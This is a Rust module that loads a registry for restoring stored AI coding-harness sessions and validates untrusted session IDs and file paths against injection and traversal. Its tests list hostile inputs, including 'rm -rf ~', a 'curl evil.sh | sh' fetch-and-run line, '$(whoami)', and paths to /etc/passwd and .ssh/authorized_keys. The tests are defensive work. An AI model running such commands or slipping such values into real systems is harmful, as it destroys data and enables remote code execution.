//! The reconstitution registry and its safety checks (APS-V1-0004 section 6.4).
//!
//! A Reconstitutor restores a stored session onto a machine so the originating
//! harness can resume it natively. This module ships the per-`source_format`
//! knowledge that requires (section 6.4.2) plus the validation every
//! Reconstitutor must perform on untrusted envelope input (section 6.4.5).
//!
//! The registry is INFORMATIVE and separately versioned. Harnesses change their
//! on-disk layout on their own schedule; a stale entry is a registry correction,
//! never a change to the envelope contract (section 8.2).
//!
//! # Why the validation lives here
//!
//! `session_id` and `metadata.source_path` both come from producers, and push
//! producers are untrusted (section 10.3). A Reconstitutor interpolates the
//! first into a resume command and uses the second to choose a filesystem write
//! location. Getting either check wrong is a remote code execution or an
//! arbitrary file write. Shipping the checks in the standard's own crate means
//! every consumer inherits one audited implementation instead of writing its
//! own.

use serde::Deserialize;
use std::collections::BTreeMap;

/// The shipped registry source, embedded verbatim.
pub const REGISTRY_TOML: &str = include_str!("../registry/reconstitution.toml");

/// The reconstitution registry: `source_format` to restore knowledge.
#[derive(Debug, Clone, Deserialize)]
pub struct Registry {
    /// Version of the registry itself, independent of `scs_version`.
    pub registry_version: String,
    /// Entries keyed by `source_format`.
    #[serde(flatten)]
    pub entries: BTreeMap<String, Entry>,
}

/// One harness's restore knowledge (section 6.4.2).
#[derive(Debug, Clone, Deserialize)]
pub struct Entry {
    /// The producing harness, matching the envelope's `agent` where applicable.
    pub harness: String,
    /// Human-readable note on the harness's on-disk layout.
    pub description: String,
    /// Where the harness expects the session file, as a template.
    pub path_template: String,
    /// How `raw` is written back to disk, for example `jsonl`.
    pub serialization: String,
    /// Anchored regex-style shape a `session_id` must match before use.
    pub session_id_pattern: String,
    /// Whether `metadata.source_path` should be preferred over the template.
    #[serde(default)]
    pub prefer_source_path: bool,
    /// How the harness derives a directory slug from a working directory.
    pub slug_rule: SlugRule,
    /// The structured resume descriptor. Never a shell string.
    pub resume: Resume,
}

/// How a harness derives its session directory slug from a working directory.
#[derive(Debug, Clone, Deserialize)]
pub struct SlugRule {
    /// `cwd_absolute` to derive from the absolute cwd, `none` if the harness
    /// does not partition by working directory.
    pub source: String,
    /// Ordered literal replacements applied to the path, as `[from, to]` pairs.
    #[serde(default)]
    pub replace: Vec<(String, String)>,
}

/// A structured resume descriptor (section 6.4.5).
///
/// Deliberately a program plus an argument vector, never a single command
/// string: a Reconstitutor invokes it WITHOUT a shell, so interpolated values
/// cannot inject additional commands.
#[derive(Debug, Clone, Deserialize)]
pub struct Resume {
    /// The program to execute, for example `claude`.
    pub program: String,
    /// Argument templates, for example `["--resume", "{session_id}"]`.
    pub args: Vec<String>,
    /// Working directory template for the resumed process.
    pub cwd: String,
}

/// Errors from loading or using the registry.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RegistryError {
    /// No entry exists for the given `source_format`.
    ///
    /// This is the correct outcome for a harness that cannot be reconstituted
    /// (Cursor, which keeps sessions in SQLite rather than per-session files).
    /// A Reconstitutor MUST fail loudly here rather than guess a path
    /// (section 6.4.3).
    UnknownSourceFormat(String),
    /// The `session_id` did not match the entry's expected shape.
    InvalidSessionId,
    /// `metadata.source_path` was absolute or escaped the harness root.
    UnsafeSourcePath,
}

impl std::fmt::Display for RegistryError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            RegistryError::UnknownSourceFormat(sf) => write!(
                f,
                "no reconstitution registry entry for source_format `{sf}`; \
                 this harness cannot be reconstituted"
            ),
            RegistryError::InvalidSessionId => {
                write!(
                    f,
                    "session_id does not match the registry entry's expected shape"
                )
            }
            RegistryError::UnsafeSourcePath => write!(
                f,
                "metadata.source_path is absolute or escapes the harness session root"
            ),
        }
    }
}

impl std::error::Error for RegistryError {}

impl Registry {
    /// Load the registry shipped with this standard.
    ///
    /// # Panics
    ///
    /// Panics if the embedded registry is malformed, which would mean the
    /// shipped package is corrupt. A test in `tests/` covers this.
    pub fn shipped() -> Self {
        toml::from_str(REGISTRY_TOML).expect("embedded reconstitution registry must parse")
    }

    /// Look up the entry for a `source_format`.
    pub fn entry(&self, source_format: &str) -> Result<&Entry, RegistryError> {
        self.entries
            .get(source_format)
            .ok_or_else(|| RegistryError::UnknownSourceFormat(source_format.to_string()))
    }
}

impl SlugRule {
    /// Derive the harness's directory slug from an absolute working directory.
    ///
    /// Returns `None` when the harness does not partition by working directory.
    pub fn slug_for(&self, cwd: &str) -> Option<String> {
        if self.source != "cwd_absolute" {
            return None;
        }
        let mut slug = cwd.to_string();
        for (from, to) in &self.replace {
            slug = slug.replace(from.as_str(), to.as_str());
        }
        Some(slug)
    }
}

impl Entry {
    /// Validate an untrusted `session_id` against this entry's expected shape
    /// (section 6.4.5).
    ///
    /// The pattern in the registry is an anchored character-class expression.
    /// Rather than pull in a regex engine for two fixed shapes, this checks the
    /// two forms the registry actually uses: a strict UUID, and a conservative
    /// identifier charset. Anything not matching is rejected, which is the safe
    /// direction: a rejected id costs a failed restore, an accepted hostile id
    /// costs command injection.
    pub fn validate_session_id(&self, session_id: &str) -> Result<(), RegistryError> {
        let ok = if self.session_id_pattern.contains("{12}") {
            is_uuid(session_id)
        } else {
            is_safe_identifier(session_id)
        };
        if ok {
            Ok(())
        } else {
            Err(RegistryError::InvalidSessionId)
        }
    }
}

/// Whether a string is a canonical 8-4-4-4-12 hex UUID.
fn is_uuid(s: &str) -> bool {
    let groups = [8usize, 4, 4, 4, 12];
    let mut parts = s.split('-');
    for expected in groups {
        match parts.next() {
            Some(p) if p.len() == expected && p.chars().all(|c| c.is_ascii_hexdigit()) => {}
            _ => return false,
        }
    }
    parts.next().is_none()
}

/// Whether a string is a conservative identifier: alphanumeric start, then
/// alphanumerics, hyphens, or underscores, bounded in length.
fn is_safe_identifier(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 128
        && s.chars().next().is_some_and(|c| c.is_ascii_alphanumeric())
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

/// Whether an untrusted `metadata.source_path` is safe to write to, relative to
/// a harness session root (section 6.4.5).
///
/// Rejects absolute paths, Windows drive prefixes, UNC prefixes, and any path
/// that escapes the root once `.` and `..` segments are resolved. NUL is
/// rejected outright.
///
/// This is a purely lexical check and is deliberately conservative. It does NOT
/// resolve symlinks, which requires filesystem access: a Reconstitutor MUST also
/// verify after resolution that the final target remains inside the root.
pub fn is_safe_source_path(source_path: &str) -> bool {
    if source_path.is_empty() || source_path.contains('\0') {
        return false;
    }
    // Absolute (POSIX), UNC, or Windows drive-qualified paths are never relative
    // to the harness root.
    if source_path.starts_with('/') || source_path.starts_with('\\') {
        return false;
    }
    let bytes = source_path.as_bytes();
    if bytes.len() >= 2 && bytes[1] == b':' && bytes[0].is_ascii_alphabetic() {
        return false;
    }
    // Walk segments, treating both separators as separators so a Windows-style
    // traversal cannot slip past a POSIX-only split.
    let mut depth: i32 = 0;
    for segment in source_path.split(['/', '\\']) {
        match segment {
            "" | "." => continue,
            ".." => {
                depth -= 1;
                if depth < 0 {
                    return false;
                }
            }
            _ => depth += 1,
        }
    }
    depth > 0
}

/// Validate an untrusted `source_path`, returning it when safe.
pub fn checked_source_path(source_path: &str) -> Result<&str, RegistryError> {
    if is_safe_source_path(source_path) {
        Ok(source_path)
    } else {
        Err(RegistryError::UnsafeSourcePath)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shipped_registry_parses_and_declares_a_version() {
        let reg = Registry::shipped();
        assert!(!reg.registry_version.is_empty());
        assert!(reg.entries.contains_key("claude-jsonl-v1"));
        assert!(reg.entries.contains_key("codex-turns-v1"));
    }

    #[test]
    fn unknown_source_format_is_an_error_not_a_guess() {
        let reg = Registry::shipped();
        // Cursor is captured but deliberately not reconstitutable (SQLite, not
        // per-session files). The registry says so by omission.
        let err = reg.entry("cursor-bubbles-v1").unwrap_err();
        assert_eq!(
            err,
            RegistryError::UnknownSourceFormat("cursor-bubbles-v1".to_string())
        );
    }

    #[test]
    fn claude_slug_rule_matches_observed_layout() {
        let reg = Registry::shipped();
        let entry = reg.entry("claude-jsonl-v1").unwrap();
        // Verified against a live ~/.claude/projects tree: separators and dots
        // both collapse to hyphens, so a dotted directory such as `.claude`
        // renders as `--claude`.
        assert_eq!(
            entry.slug_rule.slug_for("/Users/me/Code/proj").as_deref(),
            Some("-Users-me-Code-proj")
        );
        assert_eq!(
            entry
                .slug_rule
                .slug_for("/Users/me/Code/proj/.claude/worktrees/x")
                .as_deref(),
            Some("-Users-me-Code-proj--claude-worktrees-x")
        );
    }

    #[test]
    fn codex_has_no_cwd_slug() {
        let reg = Registry::shipped();
        let entry = reg.entry("codex-turns-v1").unwrap();
        assert_eq!(entry.slug_rule.slug_for("/Users/me/Code/proj"), None);
    }

    #[test]
    fn resume_is_structured_never_a_shell_string() {
        let reg = Registry::shipped();
        for (source_format, entry) in &reg.entries {
            assert!(
                !entry.resume.program.contains(' '),
                "{source_format}: resume.program must be a bare program, not a command line"
            );
            assert!(
                !entry.resume.program.is_empty(),
                "{source_format}: resume.program must be set"
            );
        }
    }

    #[test]
    fn codex_session_ids_must_be_uuids() {
        let reg = Registry::shipped();
        let entry = reg.entry("codex-turns-v1").unwrap();
        assert!(
            entry
                .validate_session_id("019e9515-c90c-74b1-9dd9-d5961364264a")
                .is_ok()
        );
        assert_eq!(
            entry.validate_session_id("not-a-uuid").unwrap_err(),
            RegistryError::InvalidSessionId
        );
    }

    #[test]
    fn session_id_injection_attempts_are_rejected() {
        let reg = Registry::shipped();
        let entry = reg.entry("claude-jsonl-v1").unwrap();
        assert!(
            entry
                .validate_session_id("0915b842-975d-4fce-bdb5-35ed5200e805")
                .is_ok()
        );
        for hostile in [
            "abc; rm -rf ~",
            "abc && curl evil.sh | sh",
            "../../etc/passwd",
            "$(whoami)",
            "`id`",
            "a b",
            "",
        ] {
            assert_eq!(
                entry.validate_session_id(hostile).unwrap_err(),
                RegistryError::InvalidSessionId,
                "must reject hostile session_id: {hostile:?}"
            );
        }
    }

    #[test]
    fn safe_source_paths_are_accepted() {
        for ok in [
            "2026/06/04/rollout-2026-06-04T17-01-33-abc.jsonl",
            "-Users-me-Code-proj/0915b842.jsonl",
            "./nested/file.jsonl",
        ] {
            assert!(is_safe_source_path(ok), "should accept: {ok}");
        }
    }

    #[test]
    fn traversal_and_absolute_source_paths_are_rejected() {
        for bad in [
            "../../../.ssh/authorized_keys",
            "/etc/passwd",
            "\\\\server\\share\\x",
            "C:\\Windows\\system32\\x",
            "a/../../..",
            "..",
            "",
            "with\0nul",
            ".",
        ] {
            assert!(!is_safe_source_path(bad), "should reject: {bad:?}");
        }
    }

    #[test]
    fn traversal_that_stays_inside_the_root_is_allowed() {
        // Descending then ascending nets out inside the root, which is fine.
        assert!(is_safe_source_path("a/b/../c.jsonl"));
        // Ascending past the root is not, even when a later segment descends.
        assert!(!is_safe_source_path("a/../../b.jsonl"));
    }

    #[test]
    fn checked_source_path_surfaces_the_error() {
        assert_eq!(
            checked_source_path("../../etc/passwd").unwrap_err(),
            RegistryError::UnsafeSourcePath
        );
        assert_eq!(checked_source_path("a/b.jsonl").unwrap(), "a/b.jsonl");
    }
}
